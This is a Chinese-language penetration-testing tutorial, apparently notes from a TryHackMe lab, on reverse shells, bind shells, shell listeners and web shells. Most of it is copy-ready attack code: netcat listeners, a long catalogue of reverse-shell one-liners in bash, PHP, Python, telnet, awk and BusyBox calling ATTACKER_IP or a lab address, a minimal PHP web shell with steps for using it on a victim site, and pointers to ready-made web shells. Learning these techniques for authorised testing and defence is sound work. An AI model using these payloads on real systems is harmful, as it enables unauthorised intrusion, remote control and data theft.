### 什么是shell

Shell 说白了就是**用户和操作系统之间的一个“传话人”**。你输入命令，它负责翻译给系统听。大多数情况下，它就是那个黑乎乎的命令行窗口，当然也有图形界面的。
在网络安全里，我们说的 Shell 通常是指**攻击者拿下一台机器后，搞到的一个能敲命令的会话**。有了这个会话，攻击者就能在别人机器上为所欲为了。
#### 拿到 Shell 之后能干啥

- **远程控制**：在目标机器上随便执行命令、跑软件。
- **提权**：如果一开始拿到的权限比较低，就想办法往上爬，搞到管理员权限。
- **偷数据**：在系统里到处翻，把敏感数据读出来、拷走。
- **留后门**：创建个账号、留个凭证，或者放个后门软件，方便下次还能进来。
- **搞破坏**：装恶意软件、建隐藏账户、删证据，想干啥干啥。
- **当跳板**：把这台机器当成一个“中转站”，去攻击网络里其他的机器。这个操作就叫**枢轴（Pivoting）**。

### 反向shell

反向 Shell，也叫“连接背壳”，是渗透测试中最常用的系统访问技术之一。它的核心特征是：**连接由目标系统主动发起，连回攻击者的机器**，以此来规避防火墙和其他安全设备的检测。

#### 反向shell工作原理

**第一步：攻击者建立监听**

反向 Shell 是目标连回攻击者，所以攻击者需要先在本机等待连接。使用 Netcat 监听：
```bash
nc -lvnp 443
```
参数含义：
- `-l`：监听模式，等待连接
- `-v`：详细输出
- `-n`：禁止 DNS 解析，仅使用 IP 地址
- `-p`：指定监听端口，此处为 443
端口可任意选择，但攻击者通常倾向于使用常见服务端口，如 `53`、`80`、`8080`、`443`、`139`、`445`。目的是将反向 Shell 混入合法流量，降低被安全设备识别的概率。

**第二步：目标执行反向 Shell Payload**

监听就绪后，攻击者需要在目标系统上执行反向 Shell Payload。该 Payload 通常借助漏洞利用或未授权访问来执行，运行后会通过网络将 Shell 暴露给攻击者。不同操作系统和工具对应的 Payload 写法各异，以下以“管道反向 Shell”为例：
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
Payload 逐段解析：


|命令片段|作用|
|---|---|
|`rm -f /tmp/f`|删除已存在的命名管道文件，避免冲突|
|`mkfifo /tmp/f`|创建命名管道（FIFO），用于进程间双向通信|
|`cat /tmp/f`|读取管道数据，等待输入|
|`\| sh -i 2>&1`|将输出管道至交互式 Shell，`2>&1` 将标准错误重定向至标准输出，确保错误信息回传攻击者|
|`\| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`|将 Shell 输出通过 Netcat 发送至攻击者|
|`>/tmp/f`|将命令输出写回命名管道，实现双向通信|

**第三步：攻击者接收 Shell**

Payload 在目标上执行后，攻击者将获得一个反向 Shell，可以像操作本地终端一样执行命令。攻击者终端输出类似：
```text
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
target@tryhackme:~$
```
其中 `10.10.13.37` 为被攻破目标的 IP 地址。

### 正向shell（bind shell/束缚壳）

#### 什么是正向 Shell

顾名思义，正向 Shell 就是**目标机把自己某个端口打开，监听连接**。一旦有人连上来，就把 Shell 会话暴露出去，攻击者就能远程执行命令。

#### 为什么用得少

- 目标机得**一直开着端口监听**，容易被安全设备发现。
- 如果目标在防火墙后面，**外部根本连不进来**，正向 Shell 就失败了。
- 所以实战中，**反向 Shell（目标主动连回来）更常用**。

#### 操作流程

**第一步：在目标机上建立监听**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
Payload 逐段解析：

| 命令片段                    | 作用                               |
| ----------------------- | -------------------------------- |
| `rm -f /tmp/f`          | 删掉已有的命名管道文件，避免冲突                 |
| `mkfifo /tmp/f`         | 创建命名管道（FIFO），用于双向通信              |
| `cat /tmp/f`            | 读管道数据，等着输入                       |
| `\| bash -i 2>&1`       | 把输出丢给交互式 Shell，`2>&1` 让错误也返回给攻击者 |
| `\| nc -l 0.0.0.0 8080` | 在所有网卡上监听 8080 端口，等着别人连进来         |
| `>/tmp/f`               | 把命令输出写回管道，形成双向通信                 |
**注意**：小于 1024 的端口需要 root 权限才能监听。所以这里用 8080，普通用户就能跑。

**第二步：在攻击机上连过去**
```bash
nc -nv TARGET_IP 8080
```
参数含义：

- `-n`：不做 DNS 解析，直接用 IP
- `-v`：显示详细信息
- `TARGET_IP`：目标机 IP
- `8080`：目标机监听的端口

**第三步：拿到 Shell**
连接成功后，攻击者终端会弹出目标机的 Shell 提示符，比如：
```text
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```
这时就能像登录目标机一样执行命令了。
#### 正向 Shell vs 反向 Shell

| 对比项   | 正向 Shell（Bind Shell） | 反向 Shell（Reverse Shell） |
| ----- | -------------------- | ----------------------- |
| 谁主动连  | 攻击者连目标               | 目标连攻击者                  |
| 目标机行为 | 开端口监听                | 执行 Payload 外连           |
| 防火墙影响 | 容易被拦（入站被挡）           | 容易绕过（出站常放行）             |
| 实战常用度 | 较少                   | 最常用                     |

### shell监听器（shell listeners）

#### 为什么需要监听器

反向 Shell 是目标主动连回攻击者，所以攻击者这边得先开个“门”等着。这个“门”就是监听器。Netcat 是最常用的，但它不是唯一的选择，而且有些场景下 Netcat 用起来不太顺手。

#### 三种常用监听器

##### 1. RLWRAP

**是什么**：一个小工具，用 GNU readline 库给程序提供**行编辑和命令历史**功能。
**为什么要用它**：裸的 Netcat 监听有个很大的痛点——**按方向键不会翻历史命令，打错了也不能用退格键修改**，交互体验极差。用 `rlwrap` 包一下 Netcat，就能用方向键翻历史、用退格键改命令了。

**用法示例**：
```bash
rlwrap nc -lvnp 443
```
就是在 `nc` 前面加个 `rlwrap`，监听体验立刻提升。
##### 2. NCAT

**是什么**：Nmap 项目组发布的 **Netcat 改进版**。
**比 Netcat 强在哪**：

- 支持 **SSL 加密**
- 支持代理
- 支持更多协议

**普通监听用法**：
```bash
ncat -lvnp 4444
```
**SSL 加密监听用法**：
```bash
ncat --ssl -lvnp 4444
```
加上 `--ssl` 参数后，Ncat 会自动生成一个临时 RSA 密钥，监听端和 Shell 之间的通信就是加密的，不容易被中间设备识别或拦截。
##### 3. SOCAT

**是什么**：一个功能强大的网络工具，可以在**两个数据源之间建立套接字连接**。
**特点**：比 Netcat 更灵活，支持更多协议和选项，但语法也更复杂。

**监听用法示例**：
```bash
socat -d -d TCP-LISTEN:443 STDOUT
```
参数含义：

- `-d -d`：启用详细输出，两个 `-d` 增加详细程度
- `TCP-LISTEN:443`：在 443 端口建立 TCP 监听
- `STDOUT`：把收到的数据输出到终端
#### 三种监听器对比

| 工具              | 核心优势       | 典型场景         |
| --------------- | ---------- | ------------ |
| **Netcat (nc)** | 简单、通用      | 基础反向 Shell   |
| **RLWRAP + nc** | 提供命令历史和行编辑 | 交互体验差的 Shell |
| **Ncat**        | 支持 SSL 加密  | 需要加密通信的场景    |
| **Socat**       | 灵活、支持多协议   | 复杂网络连接场景     |

### shell payload（弹壳有效载荷）

#### 什么是 Shell Payload

Shell Payload 是一段命令或脚本，在目标机上执行后，会把 Shell 通过网络暴露给攻击者：

- **反向 Shell**：目标主动连回攻击者
- **正向 Shell（Bind Shell）**：目标打开端口等着攻击者来连

#### 各种语言的 Payload 写法

##### 1. Bash

**普通 Bash 反向 Shell**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
启动交互式 Bash，通过 TCP 连到攻击者的 IP 和端口，把标准输出和标准错误都重定向过去。

**Bash Read Line 反向 Shell**
```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```
创建文件描述符 5，连到攻击者的 TCP 套接字，读取命令并执行，输出发回同一个套接字。

**带文件描述符 196 的 Bash 反向 Shell**
```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
类似第一个，但用文件描述符 5 做输入输出，支持 TCP 上的交互式会话。

**带文件描述符 5 的 Bash 反向 Shell**
```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
类似于第一个示例，该命令打开一个交互式 Shell（`bash -i`），但输入输出使用文件描述符 5，从而支持 TCP 连接上的交互式会话。

##### 2. PHP

**用 exec 函数**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
创建 socket 连到攻击者，用 `exec` 执行 shell 并重定向标准输入输出。

**用 shell_exec 函数**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
和上面类似，但用 `shell_exec`。

**用 system 函数**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```
用 `system` 执行命令并把结果输出。

**用 passthru 函数**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
用 `passthru` 执行命令并返回原始输出，适合处理二进制数据。

**用 popen 函数**
```
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```
用 `popen` 打开进程文件指针来执行 Shell。

##### 3. Python
> 下面这些需要用 `python -c` 来跑，代码里的 `PY-C` 就是占位符。

**通过导出环境变量**
```python
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
把远程主机和端口设为环境变量，创建 socket 连接，把标准输入输出重定向到 socket。

**用 subprocess 模块**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
用 `subprocess` 模块生成 Shell 并设置环境。

**短版 Python 反向 Shell**
```python
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
创建 socket 连到攻击者，用 `os.dup2()` 把标准输入输出和错误重定向到 socket。

##### 4. 其他

**Telnet**
```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```
用 `mkfifo` 创建命名管道，通过 Telnet 连到攻击者。

**AWK**
```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
用 AWK 内置的 TCP 功能连到攻击者，读命令并执行，结果通过同一 TCP 连接发回。

**BusyBox**
```bash
busybox nc ATTACKER_IP 443 -e sh
```
用 BusyBox 的 Netcat 连到攻击者，连上后执行 `/bin/sh`，把命令行暴露给攻击者。

###  Web Shell（网络壳）
#### 什么是 Web Shell

Web Shell 是用**被攻破的 Web 服务器支持的语言**写的一个脚本文件。它本身是一段代码，包含执行命令和处理文件的功能。上传到服务器后，攻击者就能通过 HTTP 请求让服务器执行任意命令。

**特点**：

- 伪装成正常文件，藏在 Web 应用里，不容易被发现
- 用 Web 服务器支持的语言写：PHP、ASP、JSP、CGI 等
- 攻击者通过浏览器或工具访问它，命令结果直接显示在页面上
#### PHP Web Shell 示例

最基础的 PHP Web Shell：
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
**怎么用**：

1. 保存成 `shell.php`
2. 通过文件上传漏洞、文件包含漏洞、命令注入漏洞，或者未授权访问，把它传到目标服务器上
3. 假设传到了 `http://victim.com/uploads/shell.php`
4. 访问 URL 执行命令：

```text
http://victim.com/uploads/shell.php?cmd=whoami
```

5. 浏览器就会显示 `whoami` 命令的执行结果、

#### 常见漏洞类型

|漏洞|说明|
|---|---|
|**Unrestricted File Upload**|服务器没限制上传文件类型，攻击者可以直接传 `.php` 文件|
|**File Inclusion**|服务器允许包含远程或本地文件，攻击者可以包含一个 Web Shell|
|**Command Injection**|服务器把用户输入拼进系统命令，攻击者可以直接执行命令写 Shell|
|**Unauthorized Access**|服务器目录权限配置不当，攻击者可以直接上传或访问文件|

#### 现成的 Web Shell

社区里有很多功能丰富的 Web Shell，可以直接拿来用：

|名称|特点|
|---|---|
|**P0wny-Shell**|极简的单文件 PHP Web Shell，界面像终端，支持命令执行|
|**B374K Shell**|功能更丰富，有文件管理器和命令执行|
|**C99 Shell**|老牌经典，功能强大，有命令执行和文件管理|
更多可以在 `r57shell.net` 上找。